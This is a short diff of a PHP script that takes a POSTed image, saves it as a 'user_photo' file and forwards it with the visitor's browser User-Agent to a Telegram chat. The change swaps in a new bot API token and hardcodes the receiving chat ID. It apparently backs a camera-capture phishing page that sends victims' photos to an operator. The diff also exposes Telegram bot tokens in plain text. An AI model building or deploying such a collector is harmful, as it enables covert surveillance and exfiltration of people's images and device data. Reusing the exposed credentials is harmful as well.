@@ -1,5 +1,5 @@
 <?php
-define('API_KEY', '7292028285:AAHS3tj1-Wz3m3G3W9dmb6A_6Pp50YUJkbQ');
+define('API_KEY', '8197619694:AAEgAnugoHFcbjs__CfQyKmLCyZIhnHl0hM');
 
 function sendPhoto($file, $chatId){
     $userAgent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'Unknown User-Agent';
@@ -18,11 +18,11 @@ function sendPhoto($file, $chatId){
     
     return true;
 }
-if(isset($_GET['id'])){
-    $chatId = urldecode($_GET['id']);
-}else{
-    die();
-}
+
+    
+
+$chatId = "8028388443";
+
     if(isset($_POST['image'])){
     $data = $_POST['image'];
     $file = 'user_photo_'.md5($data).'.png';
